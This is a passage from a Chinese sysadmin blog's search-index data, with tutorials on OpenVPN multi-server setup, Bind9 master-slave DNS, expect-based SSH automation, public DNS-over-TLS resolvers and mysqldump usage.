ip地址，客户端每次连接都会选择不同的server进行连接，如果失败，则自动连接下一个server。客户端轮询部分配置如下：remote server1 1194remote server2 1194remote server3 1194remote-randomresolv-retry 2那么问题来了，如何保证多台server的配置文件和用户key能保持一致呢？解决方案：以其中一台server作为逻辑主server，也就是说所有的keys用户创建，都只在这个主server上进行，然后，将&#x2F;etc&#x2F;openvpn目录下的所有文件【注意：不包括server.conf主配置文件】覆盖到server2、server3上面【注意：不要覆盖server2和server3的主配置文件: server.conf,否则你就呵呵吧】，并重启他们的openvpn服务即可。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ovpn","slug":"ovpn","permalink":"https://garywu520.github.io/tags/ovpn/"},{"name":"openvpn","slug":"openvpn","permalink":"https://garywu520.github.io/tags/openvpn/"},{"name":"vpn","slug":"vpn","permalink":"https://garywu520.github.io/tags/vpn/"},{"name":"easy-rsa3","slug":"easy-rsa3","permalink":"https://garywu520.github.io/tags/easy-rsa3/"}]},{"title":"Bind9主从同步部署","slug":"Bind9主从同步部署","date":"2018-08-17T09:20:09.000Z","updated":"2018-08-22T03:12:34.726Z","comments":true,"path":"2018/08/17/Bind9主从同步部署/","link":"","permalink":"https://garywu520.github.io/2018/08/17/Bind9%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E9%83%A8%E7%BD%B2/","excerpt":"12之前没有独立写过Bind主从同步，只有与LVS相结合的文章，故今天给补充完善。本次测试版本：bind-9.10.8-P1.tar.gz","text":"12之前没有独立写过Bind主从同步，只有与LVS相结合的文章，故今天给补充完善。本次测试版本：bind-9.10.8-P1.tar.gz 部署Bind主DNS编译安装 123456tar -zxvf bind-9.10.8-P1.tar.gzcd bind-9.10.8-P1mkdir -p &#x2F;etc&#x2F;bind.&#x2F;configure --enable-threads --with-libtool --with-ecdsa --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;web2016&#x2F;bind \\ --sysconfdir&#x3D;&#x2F;etc&#x2F;bindmakemake install 1234编译参数，释义：--enable-threads #开启多线程支持--with-libtool #使用GNU libtool--with-ecdsa #开启ECDSA算法支持 命令软链 1ln -sv &#x2F;usr&#x2F;local&#x2F;web2016&#x2F;bind&#x2F;sbin&#x2F;* &#x2F;sbin&#x2F; 创建傀儡用户named 1useradd -r -m -d &#x2F;var&#x2F;named -s &#x2F;sbin&#x2F;nologin named 创建rndc key 12345伪造数据，便于生成keyecho &quot;1111111111qqqqqqqqqqqqwwwwwwwwwwwwwwddddddddddffffffhjFD21AAAAAAAAAAA&quot; &gt;&#x2F;root&#x2F;random生成keyrndc-confgen -r &#x2F;root&#x2F;random -s 127.0.0.1 -p 953 &gt;&#x2F;etc&#x2F;bind&#x2F;rndc.conf 手动创建named.conf 1vim &#x2F;etc&#x2F;bind&#x2F;named.conf named.conf配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849options &#123; listen-on port 53 &#123; any; &#125;; &#x2F;&#x2F;定义DNS监听在哪个端口上 directory &quot;&#x2F;etc&#x2F;bind&#x2F;zone&quot;; &#x2F;&#x2F;指定DNS区域文件存放目录 pid-file &quot;&#x2F;etc&#x2F;bind&#x2F;var&#x2F;named.pid&quot;; &#x2F;&#x2F;指定named进程pid文件路径 allow-query &#123; any; &#125;; &#x2F;&#x2F;允许哪些主机可以使用该DNS来解析 Dump-file &quot;&#x2F;etc&#x2F;bind&#x2F;var&#x2F;binddump.db&quot;; &#x2F;&#x2F;缓存转储位置 Statistics-file &quot;&#x2F;etc&#x2F;bind&#x2F;stats&#x2F;named_stats&quot;; &#x2F;&#x2F;记录统计信息的文件 zone-statistics yes; &#x2F;&#x2F;收集在服务器所有域的统计数据, 这些统计数据可以通过使用rndc stats来访问 memstatistics-file &quot;&#x2F;etc&#x2F;bind&#x2F;stats&#x2F;mem_stats&quot;; &#x2F;&#x2F;记录内存使用的统计信息 empty-zones-enable yes; forwarders &#123;114.114.114.114;8.8.8.8;&#125;; &#x2F;&#x2F;定义上游DNS[需要配置root hint顶级域]&#125;;key &quot;rndc-key&quot; &#123; &#x2F;&#x2F;注：这个key部分是通过rndc-confgen命令生成的配置，贴过来 algorithm hmac-md5; secret &quot;7RJEIT7ztJyXy9A8ZlvZJA&#x3D;&#x3D;&quot;;&#125;;controls &#123; &#x2F;&#x2F;配置rndc权限与端口 inet 127.0.0.1 port 953 allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;&#125;;logging &#123; channel warning &#123; &#x2F;&#x2F;warnning可以改为default_debug（默认）。 file &quot;&#x2F;var&#x2F;log&#x2F;named&#x2F;named.log&quot; versions 10 size 10m; &#x2F;&#x2F;日志文件路径&#x2F;版本&#x2F;大小 severity warning; &#x2F;&#x2F;如果warnning改为default_debug后，此处可以改为severity dynamic print-category yes; &#x2F;&#x2F;日志中是否需要写入日志类别 print-severity yes; &#x2F;&#x2F;日志中是否需要写入消息级别 print-time yes; &#x2F;&#x2F;日志中是否需要写入时间 &#125;; channel general_dns &#123; &#x2F;&#x2F;绑定其他log channel通道，以下保持默认即可。 file &quot;&#x2F;var&#x2F;log&#x2F;named&#x2F;named2.log&quot; versions 10 size 100m; severity info; print-category yes; print-severity yes; print-time yes; &#125;; category default &#123; warning; &#125;; category queries &#123; general_dns; &#125;;&#125;;include &quot;&#x2F;etc&#x2F;bind&#x2F;view&#x2F;*.conf&quot;; #加载Bind视图文件 创建相关目录并授权 12345678mkdir -p &#x2F;etc&#x2F;bind&#x2F;zonemkdir -p &#x2F;etc&#x2F;bind&#x2F;varmkdir -p &#x2F;etc&#x2F;bind&#x2F;statsmkdir -p &#x2F;etc&#x2F;bind&#x2F;viewmkdir -p &#x2F;var&#x2F;log&#x2F;namedwget https:&#x2F;&#x2F;www.internic.net&#x2F;domain&#x2F;named.rootchown -R named.named &#x2F;etc&#x2F;bindchown -R named.named &#x2F;var&#x2F;log 配置Bind视图 1vim &#x2F;etc&#x2F;bind&#x2F;view&#x2F;view.conf 123456789101112131415161718192021222324252627282930313233343536view &quot;View&quot; &#123; &#x2F;&#x2F;配置bind视图功能 zone &quot;test.org&quot; &#123; type master; file &quot;test.org.zone&quot;; &#x2F;&#x2F;定义zone区域文件 allow-transfer &#123; &#x2F;&#x2F;允许本区域传输给特定的从DNS服务器 10.0.10.102; &#x2F;&#x2F;slave IP,可以存在多个slave &#125;; notify yes; also-notify &#123; 10.0.10.102; &#125;; &#125;; zone &quot;10.0.10.in-addr.arpa&quot; &#123; &#x2F;&#x2F;定义反向zone区域文件 type master; file &quot;10.0.10.zone&quot;; allow-transfer &#123; &#x2F;&#x2F;允许本区域传输给特定的从DNS服务器 10.0.10.102; &#x2F;&#x2F;slave IP,可以存在多个slave &#125;; notify yes; also-notify &#123; 10.0.10.102; &#125;; &#125;; zone &quot;.&quot; in &#123; type hint; file &quot;&#x2F;etc&#x2F;bind&#x2F;named.root&quot; &#125; &#125;;注：参数释义(1)区域类型有type：｛hint（根）| master（主dns）| slave（辅助DNS）| forward（转发）｝(2)notify如果是yes（默认），当一个授权的服务器修改了一个域后，DNS NOTIFY信息被发送给列在also-notify选项中的服务器。 正向区域和反向区域文件配置-略 1234需要在zone子目录定义，因为配置文件zone目录是这么写的zone配置文件语法检查named-checkzone test.org &#x2F;etc&#x2F;bind&#x2F;zone&#x2F;test.org.zone 最后再次修改目录权限 12chown -R named.named &#x2F;etc&#x2F;bindchown -R named.named &#x2F;var&#x2F;log 启动服务 12named.conf配置文件检查named-checkconf &#x2F;etc&#x2F;bind&#x2F;named.conf named启动脚本[建议使用supervisor] 1&#x2F;etc&#x2F;init.d&#x2F;named 123456789101112131415161718192021222324252627282930313233343536373839404142#!&#x2F;bin&#x2F;bash # named a network name service. # chkconfig: 345 35 75 # description: a name serverif [ &#96;id -u&#96; -ne 0 ];then echo &quot;ERROR:For bind to port 53,must run as root.&quot; exit 1ficase &quot;$1&quot; instart) if [ -x &#x2F;usr&#x2F;sbin&#x2F;named ]; then &#x2F;usr&#x2F;sbin&#x2F;named -c &#x2F;etc&#x2F;bind&#x2F;named.conf -u named &amp;&amp; echo . &amp;&amp; echo &#39;BIND9.10 server started&#39; fi ;; stop) kill &#96;cat &#x2F;etc&#x2F;named&#x2F;var&#x2F;named.pid&#96; &amp;&amp; echo . &amp;&amp; echo &#39;BIND9.10 server stopped&#39; ;;restart) echo . echo &quot;Restart BIND9.10 server&quot; $0 stop sleep 10 $0 start ;;reload) &#x2F;usr&#x2F;sbin&#x2F;rndc reload ;;status) &#x2F;usr&#x2F;sbin&#x2F;rndc status ;;*) echo &quot;$0 start | stop | restart |reload |status&quot; ;;esac 123456chmod 755 &#x2F;etc&#x2F;init.d&#x2F;namedchkconfig --add namedchkconfig named on&#x2F;etc&#x2F;init.d&#x2F;named start &#x2F;etc&#x2F;init.d&#x2F;named status 进程查看12345678[root@ns1 ~]# netstat -lntup|grep 53tcp 0 0 10.0.10.101:53 0.0.0.0:* LISTEN 2361&#x2F;named tcp 0 0 127.0.0.1:53 0.0.0.0:* LISTEN 2361&#x2F;named tcp 0 0 127.0.0.1:953 0.0.0.0:* LISTEN 2361&#x2F;named tcp6 0 0 :::53 :::* LISTEN 2361&#x2F;named udp 0 0 10.0.10.101:53 0.0.0.0:* 2361&#x2F;named udp 0 0 127.0.0.1:53 0.0.0.0:* 2361&#x2F;named udp6 0 0 :::53 :::* 2361&#x2F;named 日常管理1234&#x2F;etc&#x2F;init.d&#x2F;named start 启动服务rndc status 查看服务运行情况rndc reload 重新加载区域文件rndc stop 停止DNS服务 部署bind从DNS编译安装 1略 主配置文件/etc/bind/named.conf 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849options &#123; listen-on port 53 &#123; any; &#125;; &#x2F;&#x2F;定义DNS监听在哪个端口上 directory &quot;&#x2F;etc&#x2F;bind&#x2F;zone&quot;; &#x2F;&#x2F;指定DNS区域文件存放目录 pid-file &quot;&#x2F;etc&#x2F;bind&#x2F;var&#x2F;named.pid&quot;; &#x2F;&#x2F;指定named进程pid文件路径 allow-query &#123; any; &#125;; &#x2F;&#x2F;允许哪些主机可以使用该DNS来解析 Dump-file &quot;&#x2F;etc&#x2F;bind&#x2F;var&#x2F;binddump.db&quot;; &#x2F;&#x2F;缓存转储位置 Statistics-file &quot;&#x2F;etc&#x2F;bind&#x2F;stats&#x2F;named_stats&quot;; &#x2F;&#x2F;记录统计信息的文件 zone-statistics yes; &#x2F;&#x2F;收集在服务器所有域的统计数据, 这些统计数据可以通过使用rndc stats来访问 memstatistics-file &quot;&#x2F;etc&#x2F;bind&#x2F;stats&#x2F;mem_stats&quot;; &#x2F;&#x2F;记录内存使用的统计信息 empty-zones-enable yes; forwarders &#123;114.114.114.114;8.8.8.8;&#125;; &#x2F;&#x2F;定义上游DNS[需要配置root hint顶级域]&#125;;key &quot;rndc-key&quot; &#123; &#x2F;&#x2F;注：这个key部分是通过rndc-confgen命令生成的配置，贴过来 algorithm hmac-md5; secret &quot;7RJEIT7ztJyXy9A8ZlvZJA&#x3D;&#x3D;&quot;;&#125;;controls &#123; &#x2F;&#x2F;配置rndc权限与端口 inet 127.0.0.1 port 953 allow &#123; 127.0.0.1; &#125; keys &#123; &quot;rndc-key&quot;; &#125;;&#125;;logging &#123; channel warning &#123; &#x2F;&#x2F;warnning可以改为default_debug（默认）。 file &quot;&#x2F;var&#x2F;log&#x2F;named&#x2F;named.log&quot; versions 10 size 10m; &#x2F;&#x2F;日志文件路径&#x2F;版本&#x2F;大小 severity warning; &#x2F;&#x2F;如果warnning改为default_debug后，此处可以改为severity dynamic print-category yes; &#x2F;&#x2F;日志中是否需要写入日志类别 print-severity yes; &#x2F;&#x2F;日志中是否需要写入消息级别 print-time yes; &#x2F;&#x2F;日志中是否需要写入时间 &#125;; channel general_dns &#123; &#x2F;&#x2F;绑定其他log channel通道，以下保持默认即可。 file &quot;&#x2F;var&#x2F;log&#x2F;named&#x2F;named2.log&quot; versions 10 size 100m; severity info; print-category yes; print-severity yes; print-time yes; &#125;; category default &#123; warning; &#125;; category queries &#123; general_dns; &#125;;&#125;;include &quot;&#x2F;etc&#x2F;bind&#x2F;view&#x2F;*.conf&quot;; #加载Bind视图文件 编辑/etc/bind/rndc.key 1234key &quot;rndc-key&quot; &#123; &#x2F;&#x2F;与主DNS保持一致 algorithm hmac-md5; secret &quot;7RJEIT7ztJyXy9A8ZlvZJA&#x3D;&#x3D;&quot;;&#125;; 编辑/etc/bind/rndc.conf 12345678910key &quot;rndc-key&quot; &#123; &#x2F;&#x2F;与主DNS保持一致 algorithm hmac-md5; secret &quot;7RJEIT7ztJyXy9A8ZlvZJA&#x3D;&#x3D;&quot;;&#125;;options &#123; default-key &quot;rndc-key&quot;; default-server 127.0.0.1; default-port 953;&#125;; 创建相关目录并授权 12345678mkdir -p &#x2F;etc&#x2F;bind&#x2F;zonemkdir -p &#x2F;etc&#x2F;bind&#x2F;varmkdir -p &#x2F;etc&#x2F;bind&#x2F;statsmkdir -p &#x2F;etc&#x2F;bind&#x2F;viewmkdir -p &#x2F;var&#x2F;log&#x2F;namedwget https:&#x2F;&#x2F;www.internic.net&#x2F;domain&#x2F;named.rootchown -R named.named &#x2F;etc&#x2F;bindchown -R named.named &#x2F;var&#x2F;log 配置Bind视图 1vim &#x2F;etc&#x2F;bind&#x2F;view&#x2F;view.conf 12345678910111213141516171819202122232425view &quot;View&quot; &#123; &#x2F;&#x2F;配置bind视图功能 zone &quot;test.org&quot; &#123; type slave; &#x2F;&#x2F;正向区域文件配置为slave模式 masters &#123; 10.0.10.101; &#125;; &#x2F;&#x2F;此处要指定masterIP，可以添加多个 file &quot;slave.test.org.zone&quot;; &#x2F;&#x2F;不需要对其创建，服务启动后，会自动同步过来 &#125;; zone &quot;10.0.10.in-addr.arpa&quot; &#123; type slave; &#x2F;&#x2F;反向区域文件配置为slave模式 masters &#123; 10.0.10.101; &#125;; &#x2F;&#x2F;此处要指定masterIP，可以添加多个 file &quot;slave.10.0.10.zone&quot;; &#x2F;&#x2F;不需要对其创建，服务启动后，会自动同步过来 &#125;; zone &quot;.&quot; in &#123; type hint; file &quot;&#x2F;etc&#x2F;bind&#x2F;named.root&quot;; &#125; &#125;;注：参数释义(1)区域类型有type：｛hint（根）| master（主dns）| slave（辅助DNS）| forward（转发）｝(2)file 可以指定一个文件路径 最后再次修改目录权限 12chown -R named.named &#x2F;etc&#x2F;bindchown -R named.named &#x2F;var&#x2F;log 启动服务 12named.conf配置文件检查named-checkconf &#x2F;etc&#x2F;bind&#x2F;named.conf named启动脚本[建议使用supervisor] 1&#x2F;etc&#x2F;init.d&#x2F;named 123456789101112131415161718192021222324252627282930313233343536373839404142#!&#x2F;bin&#x2F;bash # named a network name service. # chkconfig: 345 35 75 # description: a name serverif [ &#96;id -u&#96; -ne 0 ];then echo &quot;ERROR:For bind to port 53,must run as root.&quot; exit 1ficase &quot;$1&quot; instart) if [ -x &#x2F;usr&#x2F;sbin&#x2F;named ]; then &#x2F;usr&#x2F;sbin&#x2F;named -c &#x2F;etc&#x2F;bind&#x2F;named.conf -u named &amp;&amp; echo . &amp;&amp; echo &#39;BIND9.10 server started&#39; fi ;; stop) kill &#96;cat &#x2F;etc&#x2F;named&#x2F;var&#x2F;named.pid&#96; &amp;&amp; echo . &amp;&amp; echo &#39;BIND9.10 server stopped&#39; ;;restart) echo . echo &quot;Restart BIND9.10 server&quot; $0 stop sleep 10 $0 start ;;reload) &#x2F;usr&#x2F;sbin&#x2F;rndc reload ;;status) &#x2F;usr&#x2F;sbin&#x2F;rndc status ;;*) echo &quot;$0 start | stop | restart |reload |status&quot; ;;esac 1234567chmod 755 &#x2F;etc&#x2F;init.d&#x2F;namedchkconfig --add namedchkconfig named on&#x2F;etc&#x2F;init.d&#x2F;named start &#x2F;etc&#x2F;init.d&#x2F;named status 进程查看1[root@ns2 ~]# netstat -lntup|grep 53 日常管理12345&#x2F;etc&#x2F;init.d&#x2F;named start 启动服务rndc status 查看服务运行情况rndc reload 重新加载区域文件rndc stop 停止DNS服务 压力测试123dig 分别测试主从DNS解析是否正常。接下来就可以进行压力测试了，工具很多，不进行列举 注意点正向区域zone-格式参考 12345678910111213141516171819$ORIGIN test.org. ; &#x2F;&#x2F;设置默认域$TTL 38404 ; default time to live@ IN SOA web.moxiu. admin.moxiu. ( 20180814 10800 3600 604800 38400 ) NS 10.0.10.101. ; 主DNS IP或域名 IN NS ns1.moxiu. IN NS ns2.moxiu.ns1 IN A 10.0.10.101ns2 IN A 10.0.10.102cname IN CNAME www.baidu.com.cwl IN A 1.1.1.1cwl2 IN A 7.7.7.7 12其中: $ORIGIN test.org. ; &#x2F;&#x2F;设置默认域这样的话，域名解析的时候需要：dig cw1.test.org ; 当然默认域，也可以设置为&quot;teet.&quot;, 解析的时候这样：dig cw1.teet. 也就是说解析二级域是由自己在这里控制的【顶级域是.】 关于优化1此配置文件能满足基本需求，如果需要将Bind效率提升，需要对参数进行优化。不在本篇讨论范围，Google解决。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"bind","slug":"bind","permalink":"https://garywu520.github.io/tags/bind/"},{"name":"bind9","slug":"bind9","permalink":"https://garywu520.github.io/tags/bind9/"},{"name":"bind主从","slug":"bind主从","permalink":"https://garywu520.github.io/tags/bind%E4%B8%BB%E4%BB%8E/"},{"name":"DNS","slug":"DNS","permalink":"https://garywu520.github.io/tags/DNS/"},{"name":"迭代DNS","slug":"迭代DNS","permalink":"https://garywu520.github.io/tags/%E8%BF%AD%E4%BB%A3DNS/"},{"name":"root hint","slug":"root-hint","permalink":"https://garywu520.github.io/tags/root-hint/"}]},{"title":"编写expect交互类脚本","slug":"编写expect交互类脚本","date":"2018-08-09T08:36:31.000Z","updated":"2018-08-09T11:35:55.054Z","comments":true,"path":"2018/08/09/编写expect交互类脚本/","link":"","permalink":"https://garywu520.github.io/2018/08/09/%E7%BC%96%E5%86%99expect%E4%BA%A4%E4%BA%92%E7%B1%BB%E8%84%9A%E6%9C%AC/","excerpt":"1有时候业务中免不了编写交互式输入账号密码的脚本，今天正好有需求，特意记录下 expect作用介绍1expect就是用来做交互用的，基本任何交互登录的场合都能使用，不过需要安装expect包","text":"1有时候业务中免不了编写交互式输入账号密码的脚本，今天正好有需求，特意记录下 expect作用介绍1expect就是用来做交互用的，基本任何交互登录的场合都能使用，不过需要安装expect包 expect包安装1yum install -y tcl expect expect-devel 确认expect路径12[root@localhost]# which expect&#x2F;usr&#x2F;bin&#x2F;expect 脚本语法,示例12345678[root@localhost]# cat test.et#!&#x2F;usr&#x2F;bin&#x2F;expect #与bash类似,声明脚本类型set timeout 30 #设定超时时间为30sspawn ssh garywu@192.168.1.1 -p 7113 #spawn后面接要执行的命令expect &quot;password:&quot; #捕捉交互返回的 password：关键字send &quot;garywu123\\r&quot; #发送一个密码字符串interact #表示执行完留在远程控制台；不加这句则执行完后返回本地控制台 给脚本增加执行权限1chmod +x test.et !需要注意的点12345678不能按照习惯来用sh autosu.sh来这行expect的程序，会提示找不到命令，如下：autosu.sh: line 3: spawn: command not foundcouldn&#39;t read file &quot;password:&quot;: no such file or directoryautosu.sh: line 5: send: command not foundautosu.sh: line 6: interact: command not found因为expect用的不是bash所以会报错。执行的时候直接.&#x2F;autosu.sh就可以了。～切记！ 使用ssh和expect监控RouterOS—生产环境示例：123456789101112131415161718192021222324252627282930#!&#x2F;bin&#x2F;bashHOSTNAME&#x3D;&quot;192.168.1.1&quot;PORT&#x3D;&quot;22&quot;USER&#x3D;&quot;xxx&quot;PASS&#x3D;&quot;xxxxx&quot;TMP&#x3D;$(mktemp)#创建expect脚本cat &gt; $TMP &lt;&lt; EOF set timeout -1spawn ssh -p$PORT $USER@$HOSTNAMEmatch_max 100000expect -exact &quot;password:&quot;send -- &quot;$PASS\\r&quot;sleep 1expect &quot; &gt; &quot;send -- &quot;&#x2F;system resource print\\r&quot;expect &quot; &gt; &quot;send -- &quot;quit\\r&quot;expect eofEOF#运行expect脚本stat_file&#x3D;&#x2F;tmp&#x2F;ros_status.log&#x2F;usr&#x2F;bin&#x2F;expect -f $TMP &gt;$stat_filerm $TMP 1注: 脚本运行完毕，RouterOS运行状态信息会出现在&#x2F;tmp&#x2F;ros_status.log中，通过grep或awk取出想要的值，然后自定义zabbix key即可，也可以在zabbix中配置图形展示。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"ssh","slug":"ssh","permalink":"https://garywu520.github.io/tags/ssh/"},{"name":"expect","slug":"expect","permalink":"https://garywu520.github.io/tags/expect/"},{"name":"自动输入密码","slug":"自动输入密码","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81/"},{"name":"交互式","slug":"交互式","permalink":"https://garywu520.github.io/tags/%E4%BA%A4%E4%BA%92%E5%BC%8F/"},{"name":"非交互","slug":"非交互","permalink":"https://garywu520.github.io/tags/%E9%9D%9E%E4%BA%A4%E4%BA%92/"},{"name":"使用ssh和expect监控RouterOS","slug":"使用ssh和expect监控RouterOS","permalink":"https://garywu520.github.io/tags/%E4%BD%BF%E7%94%A8ssh%E5%92%8Cexpect%E7%9B%91%E6%8E%A7RouterOS/"}]},{"title":"DNS TLS Public","slug":"DNS-TLS-Public","date":"2018-08-06T07:57:13.000Z","updated":"2018-08-06T08:08:45.668Z","comments":true,"path":"2018/08/06/DNS-TLS-Public/","link":"","permalink":"https://garywu520.github.io/2018/08/06/DNS-TLS-Public/","excerpt":"1Public DNS(TLS) Cloudflare123451.1.1.1@8531.0.0.1@8532606:4700:4700::1111@8532606:4700:4700::1001@853","text":"1Public DNS(TLS) Cloudflare123451.1.1.1@8531.0.0.1@8532606:4700:4700::1111@8532606:4700:4700::1001@853 Quad9123459.9.9.9@853149.112.112.112@8532620:fe::fe@8532620:fe::9@853 CleanBrowsing12345185.228.168.168@853185.228.168.169@8532a0d:2a00:1::@8532a0d:2a00:2::@853 Taipei12101.101.101.101@853101.102.103.104@853","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"DNS TLS","slug":"DNS-TLS","permalink":"https://garywu520.github.io/tags/DNS-TLS/"},{"name":"Public DNS","slug":"Public-DNS","permalink":"https://garywu520.github.io/tags/Public-DNS/"}]},{"title":"mysqldump数据导入导出-详解","slug":"mysqldump数据导入导出-详解","date":"2018-07-25T09:17:36.000Z","updated":"2018-07-27T10:04:32.576Z","comments":true,"path":"2018/07/25/mysqldump数据导入导出-详解/","link":"","permalink":"https://garywu520.github.io/2018/07/25/mysqldump%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-%E8%AF%A6%E8%A7%A3/","excerpt":"介绍1在日常维护工作当中经常会需要对数据进行导出操作，而mysqldump是导出数据过程中使用非常频繁的一个工具；它自带的功能参数非常多，可以轻松完成看似很复杂的需求。 本文摘选自：Pursuer.chen","text":"介绍1在日常维护工作当中经常会需要对数据进行导出操作，而mysqldump是导出数据过程中使用非常频繁的一个工具；它自带的功能参数非常多，可以轻松完成看似很复杂的需求。 本文摘选自：Pursuer.chen 语法123Usage: mysqldump [OPTIONS] database [tables]OR mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]OR mysqldump [OPTIONS] --all-databases [OPTIONS] 1.导出所有数据库1mysqldump -uroot -proot --all-databases &gt;&#x2F;tmp&#x2F;all.sql 2.导出db1、db2两个数据库的所有数据1mysqldump -uroot -proot --databases db1 db2 &gt;&#x2F;tmp&#x2F;user.sql 3.导出db1中的a1、a2表123mysqldump -uroot -proot db1 table1 table2 &gt;&#x2F;tmp&#x2F;db1.sql注意: 导出指定表只能针对一个数据库进行导出;恢复时，需要确保目标库中没有该表数据，否则可能出现主键冲突等。 4.条件导出123456789(1)当字段是整数，使用如下命令：mysqldump -uroot -proot db1 table1 -w &#39;id&#x3D;1&#39; &gt;&#x2F;tmp&#x2F;a1.sql(2)当字段是字符串,使用如下命令：mysqldump -uroot -proot db1 table1 -w &#39;id&#x3D;&#39;a&#39;&#39; &gt;&#x2F;tmp&#x2F;a1.sql(3)当字段在shell中作为变量调用mysqldump -uroot -proot db1 table1 -w &#39;DATE&gt;&#x3D;&#39;$&#123;days31_ago&#125;&#39;&#39; &gt;&#x2F;tmp&#x2F;a1.sql注：如果多个表的条件相同可以一次性导出多个表 附录：一次查询或删除同一个库的多张表 1234mysql -uroot -p -e &quot;use $&#123;remote_db2&#125;; DELETE FROM $&#123;table2_1&#125; WHERE DATE&gt;&#x3D;&#39;$&#123;days31_ago&#125;&#39;;DELETE FROM $&#123;table2_2&#125; WHERE DATE&gt;&#x3D;&#39;$&#123;days31_ago&#125;&#39;;DELETE FROM $&#123;table2_3&#125; WHERE DATE&gt;&#x3D;&#39;$&#123;days31_ago&#125;&#39;;&quot; 5.生成新的binlog文件123有时候会希望导出数据之后生成一个新的binlog文件,只需要加上-F参数即可mysqldump -uroot -proot --databases db1 -F &gt;&#x2F;tmp&#x2F;db1.sql 6.只导出表结构不导出数据，–no-data1mysqldump -uroot -proot --no-data --databases db1 &gt;&#x2F;tmp&#x2F;db1.sql 7.跨服务器导出导入数据123mysqldump --host&#x3D;h1 -uroot -proot --databases db1 |mysql --host&#x3D;h2 -uroot -proot db2注：将h1服务器中的db1数据库的所有数据导入到h2中的db2数据库中，db2的数据库必须存在否则会报错 123mysqldump --host&#x3D;h1 -uroot -proot -C --databases db1 |mysql --host&#x3D;h2 -uroot -proot db2加上-C参数启用压缩传递 8.将主库的binlog位置和文件名追加到导出数据的文件中,–dump-slave1234注意：如果当前服务器是slave服务器那么使用该命令会执行stop slave来获取master binlog的文件和位置，等备份完后会自动执行start slave启动该slave服务器。但是如果是大的数据量备份会给slave和master的延时变的更大，使用--dump-slave获取到的只是当前的从服务器的数据执行到的主的binglog的位置是（relay_mater_log_file,exec_master_log_pos),而不是主服务器当前的binlog执行的位置，主要是取决于主从的数据延时。 1234当该参数在slave服务器上执行时，相当于执行show slave status。当设置为1时，将会以CHANGE MASTER命令输出到数据文件；设置为2时，会在change前加上注释。mysqldump -uroot -proot --dump-slave&#x3D;1 --databases db1 &gt;&#x2F;tmp&#x2F;db1.sqlmysqldump -uroot -proot --dump-slave&#x3D;2 --database db1 &gt;&#x2F;tmp&#x2F;db1.sql 9.将当前服务器的binlog的位置和文件名追加输出到文件，–master-data123该参数和--dump-slave方法一样，只是它是记录的是当前服务器的binlog，相当于执行show master status，状态（file,position)的值。注意：--master-data不会停止当前服务器的主从服务 10.–opt和–skip-opt1234等同于--add-drop-table, --add-locks, --create-options, --quick, --extended-insert, --lock-tables, --set-charset, --disable-keys 该选项默认开启, 可以用--skip-opt禁用，来避免锁表。#避免备份过程中锁表mysqldump -uroot -p --host&#x3D;h1 --all-databases --skip-opt 11.保证导出的一致性状态, –single-transaction1该选项在导出数据之前提交一个BEGIN SQL语句，BEGIN 不会阻塞任何应用程序且能保证导出时数据库的一致性状态。它只适用于多版本存储引擎（它不显示加锁通过判断版本来对比数据），仅InnoDB。本选项和--lock-tables 选项是互斥的，因为LOCK TABLES 会使任何挂起的事务隐含提交。要想导出大表的话，应结合使用--quick 选项。 12--quick, -q不缓冲查询，直接导出到标准输出。默认为打开状态，使用--skip-quick取消该选项。 12.开始导出前，锁定所有表, –lock-tables,-l123用READ LOCAL锁定表以允许MyISAM表并行插入。对于支持事务的表例如InnoDB和BDB，--single-transaction是一个更好的选择，因为它根本不需要锁定表。请注意当导出多个数据库时，--lock-tables分别为每个数据库锁定表。因此，该选项不能保证导出文件中的表在数据库之间的逻辑一致性。不同数据库表的导出状态可以完全不同。 13.导出存储过程和自定义函数, –routines, -R1mysqldump -uroot -p --host&#x3D;localhost --all-databases --routines 14.压缩备份+还原12345678910压缩备份mysqldump -uroot -p -P3306 -q -Q --default-character-set&#x3D;utf8 --hex-blob --skip-lock-tables --databases abc 2&gt;&#x2F;abc.err |gzip &gt;&#x2F;abc.sql.gz注：-q或--quick :不缓冲查询，直接导出到标准输出。默认为打开状态，使用--skip-quick取消该选项。-Q或--quote-names: 使用（&#96;）引起表和列名。默认为打开状态，使用--skip-quote-names取消该选项。--default-character-set: 设置默认字符集,默认为utf-8--hex-blob:使用十六进制格式导出二进制字符串字段。如果有二进制数据就必须使用该选项。影响到的字段类型有BINARY、VARBINARY、BLOB。 12还原gunzip -c abc.sql.gz |mysql -uroot -p -vvv -P3306 --default-character-set&#x3D;utf8 abc 1&gt; abc.log 2&gt;abc.err 附录：参数说明：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328--all-databases , -A: 导出全部数据库。mysqldump -uroot -p --all-databases--all-tablespaces , -Y: 导出全部表空间。mysqldump -uroot -p --all-databases 